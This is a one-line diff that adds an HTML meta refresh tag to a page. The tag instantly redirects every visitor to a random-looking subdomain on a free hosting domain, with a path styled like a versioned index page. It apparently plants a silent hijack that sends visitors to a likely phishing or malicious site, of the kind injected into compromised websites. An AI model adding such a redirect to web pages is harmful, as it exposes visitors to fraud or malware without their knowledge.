@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=https://blafqffronwrsbm.nut.cc/en/v4/index.php" />
